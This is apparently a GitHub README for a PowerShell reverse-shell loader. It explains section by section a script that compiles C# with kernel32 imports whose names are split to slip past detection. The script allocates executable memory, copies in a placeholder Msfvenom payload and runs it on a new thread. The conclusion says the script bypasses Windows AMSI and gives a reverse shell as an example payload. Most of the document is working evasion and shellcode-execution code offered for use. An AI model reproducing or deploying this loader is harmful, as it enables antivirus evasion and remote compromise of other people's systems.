# Powershell_Rev_Scripts
## Explanation
# 1.
```powershell
$pythonmods = @"
using System;
using System.Runtime.InteropServices;
...
```
A variable called pythonmods is created and is a string that holds multiple lines of code emphasized by the '@"' or here strings. It includes the System and System.Runtime.InteropServices namespace.

# 2.
```powershell
public class K2 {
    [DllImport("kernel32", EntryPoint="Get" + "Proc" + "Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);
    [DllImport("kernel32", EntryPoint="Load" + "Library")]
    public static extern IntPtr ll(string name);
    [DllImport("kernel32", EntryPoint="Virtual" + "Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
```
This part of the code defines a class named K2 which calls Windows API functions using DllImport. 
The first import is "GetProcAddress" obsuscated by splitting into "Get" + "Proc" + "Address". 
- This import is used to get the address
The second import is "LoadLibrary" obsuscated by splitting into "Load" + "Library".
- This import is to load a dynamic link library also known as a DLL into the memory
The third import is "VirtualProtect" obsucated by splitting into "Virtual" + "Protect".
- This import is used to modify a region of memory's protection ie making it writable, executable, etc.

# 3.
```powershell
[DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );
```
This method creates a method called CreateThread which executes code at the address specified by lpStartAddress

# 4.
```powershell
[DllImport("kernel32", EntryPoint="Virtual" + "Alloc")]
    public static extern IntPtr va(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    public static void Copy(Byte[] source, Int32 startIndex, IntPtr destination, Int32 length) {
        Marshal.Copy(source, startIndex, destination, length);
    }
}
"@
```
The import is "VirtualAlloc" obsuscated by splitting into "Virtual" + "Alloc".
- This import is used to allocate memory for our shellcode
The helper function Copy is used to copy bytes to a specific memory location

# 5.
```powershell
Add-Type -TypeDefinition $pythonmods -Language CSharp
```
This tells PowerShell add the type definition $pythonmods specify the code as C# and compile it. 

# 6.
```powershell
$pl = [Byte[]] (
    # Enter Payload Here
)
```
This part is where to add the payload such as Msfvenom

# 7.
```powershell
$plSize = $pl.Length

$mem = [K2]::va([IntPtr]::Zero, [UIntPtr]::new($plSize), 0x3000, 0x40)

[K2]::Copy($pl, 0, $mem, $plSize)
```
First calculated the size of the payload in bytes and store as $plSize
Next allocate memory for the payload using the VirtualAlloc function with the va method. Add the allocation type 0x3000 which means to have the memory region both reserved and comitted.
- 0x1000 (MEM_COMMIT)
    - Flag used to allocate physical storage
- 0x2000 (MEM_RESERVE)
    - Flag that reserves memory space and saves it for future use
Add the protection flag 0x40 which indicates PAGE_EXECUTE_READWRITE meaning the memory can be executed, read, and written to.
Next copy the payload into the allocated memory.

# 8.
```powershell
$oldProtect = 0
$protectionResult = [K2]::vp($mem, [UIntPtr]::new($plSize), 0x40, [ref]$oldProtect)
```
Changes the allocated memory protection to 0x40 which allows the payload to execute as soon as it's copied into memory. The vp method is called to ensure the memory is executable.

# 9.
```powershell
$threadId = [IntPtr]::Zero
$hThread = [K2]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$threadId)
```
Creates a thread that executes at the allocated memory of which the copied payload resides. 

# 10.
```powershell
while ($true) {
    Start-Sleep -Seconds 60
}
```
Infinite loop that waits 60 seconds between each iteration of the loop

# Conclusion
This script bypasses Windows AMSI and executes shellcode using PowerShell. Even if the PowerShell window is given the command ctr-c it will continue to run in the background. 
- Teminating the Process
    - Terminate the thread or PowerShell itself using TaskManager.
    - After the shell code completely finishes it should cause the thread to terminate
        - Ex. Reverse Shell after the attacker terminates the session the thread should also be terminated